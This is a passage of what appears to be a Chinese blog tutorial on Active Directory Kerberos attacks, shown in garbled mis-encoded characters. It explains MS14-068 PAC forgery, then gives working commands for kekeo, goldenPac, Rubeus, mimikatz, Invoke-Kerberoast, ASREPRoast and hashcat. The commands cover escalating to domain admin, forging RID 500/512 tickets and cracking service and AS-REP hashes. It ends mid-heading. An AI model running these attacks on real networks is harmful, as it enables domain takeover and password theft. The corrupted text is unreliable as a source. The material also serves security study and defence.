å¯¹åº”æ•°å­—1,ç”±ä¸Šä¸Šå›¾å¯çŸ¥è¿™æ˜¯PACçš„å¤–å£³ã€‚<br>è‹¥ç±»å‹ä¸º AD-IF-RELEVAN ,é‚£ä¹ˆad-dataä¹Ÿæ˜¯ä¸€ä¸ª AuthorizationDataç±»å‹çš„ç»“æ„ä½“ï¼Œä¹Ÿæœ‰ad-type å’Œad-data.é‚£ä¹ˆè¿™ä¸ªå¤–å£³ad-dataçš„ad-typeå°±æ˜¯æ¬¡å¤–å£³AD-WIN2K-PAC äº†,ä¸ AD-WIN2K-PAC è¿™ä¸ªad-typeå¯¹åº”çš„ad-dataå°±æ˜¯ä¸€æ®µè¿ç»­ç©ºé—´ã€‚ è¿™æ®µç©ºé—´åŒ…å«ä¸€ä¸ªå¤´éƒ¨PACTYPEä»¥åŠè‹¥å¹²ä¸ªPAC_INFO_BUFFER ã€‚<br>PACTYPEåŒ…å«çš„æ˜¯ cBuffers,ç‰ˆæœ¬ä»¥åŠç¼“å†²åŒº ã€‚<br>PAC_INFO_BUFFERæ˜¯key-valueå‹çš„ã€‚PAC_INFO_BUFFERçš„keyæœ‰å¾ˆå¤š</p><table><thead><tr><th>0x00000001</th><th>ç™»å½•ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚å…¶ä»–ç™»å½•ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</th></tr></thead><tbody><tr><td>0x00000002</td><td>å‡­è¯ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªæ­¤ç±»ç¼“å†²åŒºã€‚ç¬¬äºŒæˆ–åç»­å‡­è¯ä¿¡æ¯ç¼“å†²åŒºåœ¨æ¥æ”¶æ—¶å¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x00000006</td><td>æœåŠ¡å™¨æ ¡éªŒå’Œã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚å…¶ä»–ç™»å½•æœåŠ¡å™¨æ ¡éªŒå’Œç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x00000007</td><td>KDCï¼ˆç‰¹æƒæœåŠ¡å™¨ï¼‰æ ¡éªŒå’Œï¼ˆç¬¬2.8èŠ‚ï¼‰ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„KDCæ ¡éªŒå’Œç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x0000000A</td><td>å®¢æˆ·åç§°å’Œç¥¨è¯ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„å®¢æˆ·å’Œç¥¨æ®ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x0000000B</td><td>å—çº¦æŸçš„å§”æ´¾ä¿¡æ¯ã€‚PACç»“æ„å¿…é¡»åŒ…å«ä¸€ä¸ªS4U2proxyè¯·æ±‚çš„æ­¤ç±»ç¼“å†²åŒºï¼Œå¦åˆ™ä¸åŒ…å«ã€‚é™„åŠ çš„å—çº¦æŸçš„å§”æ‰˜ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x0000000C</td><td>ç”¨æˆ·ä¸»ä½“åç§°ï¼ˆUPNï¼‰å’ŒåŸŸåç³»ç»Ÿï¼ˆDNSï¼‰ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚æ¥æ”¶æ—¶å¿…é¡»å¿½ç•¥ç¬¬äºŒä¸ªæˆ–åç»­çš„UPNå’ŒDNSä¿¡æ¯ç¼“å†²åŒºã€‚</td></tr><tr><td>0x0000000D</td><td>å®¢æˆ·ç´¢å–ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„å®¢æˆ·è¦æ±‚ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x0000000E</td><td>è®¾å¤‡ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„è®¾å¤‡ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr><tr><td>0x0000000F</td><td>è®¾å¤‡å£°æ˜ä¿¡æ¯ã€‚PACç»“æ„ä¸åº”åŒ…å«å¤šä¸ªè¿™ç§ç±»å‹çš„ç¼“å†²åŒºã€‚é™„åŠ çš„è®¾å¤‡å£°æ˜ä¿¡æ¯ç¼“å†²åŒºå¿…é¡»è¢«å¿½ç•¥ã€‚</td></tr></tbody></table><p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯1,6å’Œ7</p><p><strong>0x00000001 KERBVALIDATIONINFO</strong> è¿™ä¸ªç»“æ„ç”¨äºå­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯.å®ƒæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“æ˜¯è¿™æ ·çš„(å¾…ä¼šæˆ‘ä»¬ä¼ªé€ PACçš„æ—¶å€™ä¸»è¦å°±æ˜¯ä¼ªé€ æ­¤å¤„é¢ UserId ä»¥åŠ PGROUP_MEMBERSHIP GroupIds ï¼‰æœåŠ¡å™¨è§£åŒ…PACåæå–ç”¨æˆ·çš„sidä»¥åŠgroupidï¼Œç„¶åå°±æŠŠå½“å‰å‘åŒ…è¿‡æ¥çš„ç”¨æˆ·æƒé™å½“æˆsidï¼Œgroupidçš„æƒé™å¤„ç†ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;ç”¨æˆ·çš„sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;ç”¨æˆ·æ‰€åœ¨çš„ç»„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹çš„è¿™ä¸ªçš„è¯ï¼Œæ·»åŠ ä¸€ä¸ª500(åŸŸç®¡ç»„)ï¼Œé‚£ç”¨æˆ·å°±æ˜¯åŸŸç®¡äº†ã€‚åœ¨ms14068 PACç­¾åè¢«ç»•è¿‡ï¼Œç”¨æˆ·å¯ä»¥è‡ªå·±åˆ¶ä½œPACçš„æƒ…å†µåº•ä¸‹ï¼Œpykekå°±æ˜¯é å‘è¿™ä¸ªåœ°æ–¹å†™è¿›åŸŸç®¡ç»„ï¼Œæˆä¸ºä½¿å¾—æ”¹ç”¨æˆ·å˜æˆåŸŸç®¡</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure><p><strong>0x00000006å’Œ0x00000007</strong> 6æ˜¯æœåŠ¡å™¨æ ¡éªŒå’Œï¼Œç”±serverå¯†ç åŠ å¯†ã€‚7æ˜¯KDCæ ¡éªŒå’Œï¼ŒåˆKDCå¯†ç åŠ å¯†ã€‚å­˜åœ¨çš„ç›®çš„å°±æ˜¯é˜²æ­¢PACè¢«ç¯¡æ”¹ã€‚</p><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>è¿™ä¸ªæ¼æ´çš„äº§ç”Ÿä¸»è¦æ˜¯å¾®è½¯çŠ¯ä¸‹äº†ä¸‰ä¸ªé”™è¯¯ï¼š<br>1.å¯¹æ ¡éªŒå’Œçš„ç®—æ³•å®ç°ä¸å¤Ÿç»†è‡´ï¼Œå¯¼è‡´åœ¨æ ¡éªŒå’Œç”Ÿæˆæ—¶å¯ä»¥ä¸ç”¨ç®¡serverå’ŒKDCçš„hashç›´æ¥ç”Ÿæˆï¼Œè€Œä¸”ç”Ÿæˆå‡ºæ¥çš„æ ¡éªŒå’Œè¿˜æ˜¯åˆæ³•çš„<br>2.PACå¯ä»¥ä¸ç”¨æ”¾åœ¨TGTä¸­ï¼Œå³ä½¿æ˜¯è¿™æ ·ï¼ŒKDCä¹Ÿèƒ½ç…§å¸¸è§£æå‡ºTGTå¤–çš„PAC<br>3.ä¸‹é¢å†è¯´</p><p>é‚£ä¹ˆè¿™ä¸ªæ¼æ´å¤§è‡´çš„æ”»å‡»åŸç†æ˜¯ä»€ä¹ˆå‘¢ã€‚<br>é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨as_requestçš„æ—¶å€™ï¼ŒæŠŠinclude-PACæ ‡å¿—è®¾ç½®ä¸ºfalseï¼Œé‚£ä¹ˆas_repå°±ä¸ä¼šåœ¨TGTä¸­è¿”å›PACäº†ã€‚ç„¶åè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è‡ªå·±ä¼ªé€ ä¸€ä¸ªpacï¼Œåœ¨TGS_REQæ—¶å‘è¿‡å»å°±è¡Œäº†ã€‚ä¼ªé€ çš„pacä¿®æ”¹USER SID&amp;GROUP SID(åœ¨PACçš„ <strong>0x00000001 KERBVALIDATIONINFO</strong> ç»“æ„)å¯ä»¥æŠŠæˆ‘ä»¬çš„ç”¨æˆ·æƒé™æ”¹åˆ°å¾ˆé«˜ï¼ˆåŸŸç®¡ï¼‰ï¼Œä»è€Œè¾¾åˆ°ææƒåˆ°åŸŸç®¡çš„èƒ½åŠ›ã€‚</p><p>é‚£ä¹ˆä¼ªé€ PACï¼Œæˆ‘ä»¬å°±é‡åˆ°äº†ä¸¤ä¸ªé—®é¢˜ï¼š<br>1.pacé‡Œæœ‰æ ¡éªŒå’Œï¼Œé˜²æ­¢è‡ªå·±è¢«ç¯¡æ”¹ï¼Œæˆ‘ä»¬å¾—æœ‰serverå’ŒKDCå¯†ç æ‰èƒ½ä½¿æ ¡éªŒå’Œåˆæ³•ã€‚<br>2.pacæŒ‰ç†è¯´åº”è¯¥åœ¨TGTé‡Œï¼Œä½†æ˜¯TGTæ˜¯è¢«kbrtgt hashåŠ å¯†çš„ï¼Œæˆ‘ä»¬æ— æ³•è·å–kbrtgt hashç»§è€Œæ— æ³•ä¿®æ”¹TGTå†…å®¹ï¼Œç»§è€Œä¸èƒ½ä¿®æ”¹PACã€‚</p><p>æ¥è¯´è¯´å¦‚ä½•ç»•è¿‡PACæ ¡éªŒå’Œé—®é¢˜ã€‚<br>æˆ‘ä»¬åˆšåˆšè¯´è¿‡ï¼Œ<strong>0x00000006å’Œ0x00000007</strong> è¿™ä¸¤ä¸ªç»“æ„çš„å­˜åœ¨æ˜¯ä¸ºäº†é˜²æ­¢PACè¢«ç¯¡æ”¹ï¼Œè¿™ä¸ªæ ¡éªŒå’Œç®—æ³•é‡‡ç”¨çš„æ˜¯ä¸ªå«checksumç®—æ³•ç„¶åæŠŠkdc hashå’ŒæœåŠ¡hashå½“ä½œkeyå¯¹PACåŠ å¯†äº§ç”Ÿçš„å€¼ï¼Œä»è€Œé˜²æ­¢PACè¢«ç¯¡æ”¹ã€‚ä½†æ˜¯checksumç®—æ³•æ˜¯æœ‰å¾ˆå¤šç§çš„ï¼Œmd5ä¹Ÿæ˜¯checksumçš„åˆ†æ”¯ä¹‹ä¸€ï¼Œä¿®æ”¹PACåï¼Œæˆ‘ä»¬åªéœ€è®¾ç½®åŠ å¯†ç®—æ³•ä¸ºMD5å¹¶ç”¨MD5ç®—æ³•å¯¹<strong>0x00000001 KERBVALIDATIONINFO</strong>è¿›è¡ŒåŠ å¯†ï¼Œå°†ç”Ÿæˆçš„å€¼æ”¾å…¥ä¸¤ä¸ªæ£€éªŒå’Œå³å¯ï¼ŒKDCæ‹¿åˆ°<strong>0x00000001 KERBVALIDATIONINFO</strong>ï¼Œå¹¶ä¸”é€šè¿‡è§£ææ•°æ®åŒ…è·å–å½“å‰åŠ å¯†ç®—æ³•ä¸ºMD5ï¼Œç„¶åå¯¹å…¶è¿›è¡ŒMD5åŠ å¯†ï¼Œè‹¥åŠ å¯†ç»“æœä¸æ ¡éªŒå’Œä¸€è‡´ï¼Œåˆ™è®¤ä¸ºPACæœªè¢«ä¿®æ”¹</p><p>å†æ¥è¯´è¯´å¦‚ä½•ç»•è¿‡krbtgt hashåŠ å¯†TGTçš„é—®é¢˜ã€‚<br>å› ä¸ºæˆ‘ä»¬åœ¨AS_REQæ—¶è®¾ç½®include-PACä¸ºfalseï¼ŒTGTé‡Œå°±ä¸ä¼šåŒ…å«PACäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨TGS_REQæ—¶å¦‚ä½•æŠŠPACä¼ é€’ç»™KDCï¼Ÿåªéœ€è¦æŠŠPACæ”¾å…¥req-bodyå³å¯ã€‚<br>è¿™æ ·KDCä¾æ—§ä¼šæ­£å¸¸è§£æè¿™ä¸ªTGS_REQåŒ…</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQæˆªå›¾20210217132156"></p><p>æ³¨æ„TGS_REQé‡Œçš„include-pacä¾æ—§æ˜¯falseã€‚<br><strong>ç„¶åKDCæ¥æ”¶åˆ°PACåä¼šå…ˆè§£å¯†TGTæ‹¿åˆ°authenticatoré‡Œçš„keyå¯¹PACè¿›è¡Œè§£å¯†ï¼ˆTGS_REQæ—¶åŠ å¯†PACç”¨çš„keyæ˜¯éšæœºç”Ÿæˆçš„ï¼Œè¿™ä¸ªkeyä¼šæ”¾åœ¨authenticatoré‡Œï¼‰ï¼Œç„¶åéªŒè¯ä¸€ä¸‹PACçš„ç­¾åï¼Œè‹¥æˆåŠŸç„¶åæŠŠè§£å¯†å¾—åˆ°çš„PACé‡‡ç”¨server keyå’ŒKDC keyé‡æ–°ç”Ÿæˆæ ¡éªŒå’Œï¼Œæ‹¼æ¥æˆä¸€ä¸ªæ–°çš„TGTè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</strong><br>ä¸Šé¢è¿™ä¸€æ®µå°±æ˜¯å¾®è½¯çŠ¯ä¸‹çš„ç¬¬ä¸‰ä¸ªé”™è¯¯ï¼Œå¾ˆä¸å¯æ€è®®ï¼Œå±…ç„¶è«åå…¶å¦™çš„è¿”å›äº†ä¸€ä¸ªåŒ…å«äº†PACçš„TGTå›æ¥ã€‚æ€»ç»“æ¥è¯´å°±æ˜¯æ„é€ äº†ä¸€ä¸ªç•¸å½¢çš„TGS_REQï¼Œä»TGS_RESå¾—åˆ°äº†ä¸€ä¸ªåŒ…å«ä¼ªé€ PACçš„TGTã€‚</p><p>åŸç†å°±æ˜¯ä¸Šé¢è¿™äº›ï¼Œç„¶åæˆ‘ä»¬ç”¨åŒ…å«ä¼ªé€ PACçš„TGTåˆ°å¤„è®¿é—®æœåŠ¡å³å¯ã€‚</p><h3 id="M14068åˆ©ç”¨"><a href="#M14068åˆ©ç”¨" class="headerlink" title="M14068åˆ©ç”¨"></a>M14068åˆ©ç”¨</h3><p>1.å·¥å…·kekeo<a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>å…·ä½“æ–¹æ³•ä¸ºï¼Œåœ¨kekeoé‡Œå…ˆæ‰§è¡Œ kerberos::purgeæ¸…ç©ºç¥¨æ®<br>ç„¶åå†æ‰§è¡Œ exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>å³å¯ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQæˆªå›¾20210217132222"></p><p>ç„¶åå°±dir \åŸŸæ§\c$ è¯•è¯•ï¼Œå¦‚æœå¯ä»¥å°±è¯´æ˜ææƒæˆåŠŸäº†ï¼ˆä¸æ˜¯æ¯æ¬¡éƒ½èƒ½æˆåŠŸçš„)</p><p>2.golenpac <a href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p><p>è¿™ä¸ªå·¥å…·å¥½ç”¨,</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQæˆªå›¾20210217132233"></p><p>æ‰§è¡Œç±»ä¼¼ä¸Šè¿°å‘½ä»¤ï¼Œå°±èƒ½è¿”å›ä¸€ä¸ªåŸŸæ§çš„ systemæƒé™çš„cmd shellå›æ¥ï¼Œæ„Ÿè§‰è›®å¥½ç”¨<br>å¦å¤–åœ¨æœ€åæŒ‡å®šåŸŸæ§æœºå™¨æ—¶ï¼Œå¯ä»¥æŒ‡å®šåŸŸæ§ä»¥å¤–çš„æœºå™¨å¹¶è·å–ä»–ä»¬çš„æœ¬åœ°systemæƒé™ç”¨æˆ·.<br>ä½†è¿”å›çš„ä¼¼ä¹ä¸æ˜¯åŸŸæ§ï¼Ÿ</p><h2 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h2><p>Kerberoastæ”»å‡»åŸç†: æ”»å‡»è€…ä» TGS-REP ä¸­æå–åŠ å¯†çš„æœåŠ¡ç¥¨è¯ã€‚ ç”±äºæœåŠ¡ç¥¨è¯æ˜¯ç”¨é“¾æ¥åˆ°è¯·æ±‚ SPN çš„å¸æˆ·çš„å“ˆå¸ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ç¦»çº¿ç ´è§£è¿™ä¸ªåŠ å¯†å—ï¼Œæ¢å¤å¸æˆ·çš„æ˜æ–‡å¯†ç </p><h3 id="How-to-get-SPN"><a href="#How-to-get-SPN" class="headerlink" title="How to get SPN"></a>How to get SPN</h3><p>å¦‚ä½•å¾—åˆ°åŸŸä¸­çš„æ‰€æœ‰SPNï¼Ÿ</p><p><strong>1.setspn</strong><br>å¾ˆç®€å•ï¼Œåªéœ€æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>å³å¯</p><p><strong>2.kerberoastå·¥å…·é›†çš„GetUserSpns powershellè„šæœ¬</strong></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png" alt="QQæˆªå›¾20210217132445"></p><h3 id="How-to-get-HASH"><a href="#How-to-get-HASH" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p>å¦‚ä½•å¾—åˆ°hashï¼Ÿ<br>æœ‰å¦‚ä¸‹æ–¹æ³•</p><p><strong>1.Rubeus.exe</strong></p><p>è¿™ä¸ªå·¥å…·githubä¸Šå°±æœ‰ï¼Œä½†æ˜¯cloneä¸‹æ¥åéœ€è¦è‡ªå·±ç¼–è¯‘æˆexe.</p><p>ç„¶åæ‰§è¡Œ Rubeus.exe kerberoastæŒ‡ä»¤å³å¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png" alt="QQæˆªå›¾20210217132502"></p><p><strong>2.mimikatz</strong></p><p>mimikatzçœŸçš„ç¥å™¨ã€‚<br>é€šè¿‡å‘½ä»¤ kerberos::ask /target:ä½ æ‰€æŒ‡å®šçš„SPN,</p><p><img src="http://www.const27.com/wp-content/uploads/2020/09/image-33.png" alt="img"></p><p>å³å¯é€šè¿‡è®¤è¯çš„æ–¹å¼å¾—åˆ°ä¸€ä¸ªSTã€‚<br>ç„¶åæˆ‘ä»¬åœ¨kerberos::listé‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æƒ³è¦çš„ST</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png" alt="QQæˆªå›¾20210217132529"></p><p><strong>3.powershell</strong></p><p>è¶Šæ¥è¶Šå‘ç°powershellåœ¨åŸŸæ¸—é€ä¸­çš„é‡è¦æ€§äº†<br>è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼Œå³å¯å®ŒæˆHASHè·å–</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åmimikatzå¯¼å‡ºå³å¯</p><h3 id="How-to-export-hash"><a href="#How-to-export-hash" class="headerlink" title="How to export hash"></a>How to export hash</h3><p>è·å¾—äº†STç¥¨æ®ï¼Œä½†æ€ä¹ˆå¯¼å‡ºï¼Ÿ</p><p><strong>1.mimikatz</strong></p><p>å¯¼å‡ºæ‰€æœ‰ç¥¨æ®</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png" alt="QQæˆªå›¾20210217132544"></p><p>å¯ä»¥å‘ç°ç”Ÿæˆäº†kirbiæ–‡ä»¶ã€‚è¿™å°±æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„hashäº†</p><p><strong>2.Empire Powershell æ¡†æ¶</strong></p><p>github:<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p><p>æˆ‘ä»¬é€šè¿‡è¿™ä¸ªæ¡†æ¶å¯ä»¥å¯¼å‡ºhashcatæ ¼å¼çš„hash.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png" alt="QQæˆªå›¾20210217132627"></p><h3 id="How-to-crack-HASH"><a href="#How-to-crack-HASH" class="headerlink" title="How to crack HASH"></a>How to crack HASH</h3><p>å¦‚ä½•ç ´è§£HASH?</p><p><strong>1.HASHCAT</strong></p><p>è¿™ä¸ªå·¥å…·éœ€è¦è®©hashæ ¼å¼ä¸ºhashcatæ¨¡å¼æ‰èƒ½è¿›è¡Œç ´è§£ã€‚kribiæ–‡ä»¶ä¸èƒ½æ”¾å…¥hashcatè¿›è¡Œç ´è§£.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 13110 pass.txt hash.txt</span><br></pre></td></tr></table></figure><p><strong>2.kerberoastä¸­çš„tgsrepcrack.py</strong></p><p>æ”¯æŒkribiæ–‡ä»¶ç ´è§£</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 tgsrepcrack.py pass.txt xxx.kribi</span><br></pre></td></tr></table></figure><h3 id="How-to-use-Kerberoast"><a href="#How-to-use-Kerberoast" class="headerlink" title="How to use Kerberoast"></a>How to use Kerberoast</h3><p>æ—¢ç„¶æˆ‘ä»¬éƒ½æŠŠSTçš„åŠ å¯†hashéƒ½ç ´è§£äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥éšä¾¿æ”¹STä¸­çš„ç¥¨æ®å†…å®¹äº†..\ è¿™é‡Œä½¿ç”¨çš„æ˜¯kerberoastå·¥å…·é›†é‡Œçš„kerberoast.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line">## å°†ç¥¨æ®æƒé™æ”¹ä¸ºadministrator</span><br><span class="line">kerberos::ptt PENTESTLAB.kirbi  #å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜</span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roast"><a href="#AS-REP-Roast" class="headerlink" title="AS_REP Roast"></a>AS_REP Roast</h2><p>è¾ƒKerberoastæ¥è¯´ï¼Œæ¯”è¾ƒé¸¡è‚‹ã€‚<br>å®ƒçš„åŸç†æ˜¯åœ¨ä¸å¼€å¯kerberosé¢„èº«ä»½éªŒè¯çš„å‰æä¸‹ï¼Œè·å¾—å…¶ä»–ç”¨æˆ·çš„AS_RESï¼Œå¹¶ç ´è§£åŠ å¯†session key çš„ client hashã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png" alt="QQæˆªå›¾20210217132642"></p><h3 id="How-to-get-HASH-1"><a href="#How-to-get-HASH-1" class="headerlink" title="How to get HASH"></a>How to get HASH</h3><p><strong>1.Rubeus</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šæœç´¢åŸŸä¸­ä¸éœ€è¦kerberosé¢„éªŒè¯çš„ç”¨æˆ·ï¼Œå¹¶è·å¾—ASREPã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png" alt="QQæˆªå›¾20210217132654"></p><p><strong>2.Empireæ¡†æ¶ä¸ ASREPRoast.ps1</strong></p><p>ä½¿ç”¨Empireæ¡†æ¶ä¸‹çš„powerview.ps1æŸ¥æ‰¾åŸŸä¸­è®¾ç½®äº† â€œä¸éœ€è¦kerberosé¢„èº«ä»½éªŒè¯â€ çš„ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png" alt="QQæˆªå›¾20210217132707">ç„¶åç”¨ ASREPRoast.ps1 ï¼š<a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a> è·å–æŒ‡å®šç”¨æˆ·çš„AS-REPhash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure><p>å°±ä¼šç”Ÿæˆä¸€ä¸ªhashæ•°æ®æ–‡ä»¶äº†</p><h3 id="How-to-crack-hash"><a href="#How-to-crack-hash" class="headerlink" title="How to crack hash"></a>How to crack hash</h3><p>å°†ç”Ÿæˆçš„HASHä¿å­˜èµ·æ¥ï¼Œå¹¶åœ¨ä¸‹å›¾å¤„åŠ å…¥$23</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png" alt="QQæˆªå›¾20210217132743"></p><p>ç„¶åä¸¢ç»™hashcat è·‘</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„pass.txtæ˜¯è‡ªå·±çš„æ˜æ–‡å­—å…¸â€¦ä¹‹å‰æˆ‘è¿˜ä¸€ç›´ä»¥ä¸ºæ˜¯çˆ†ç ´å‡ºæ¥çš„ç»“æœ.<br>åŸæ¥æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„ç”¨æ˜æ–‡å­—å…¸å»çˆ†ç ´ã€‚</p><h2 id="å§”æ´¾æ”»å‡»"><a 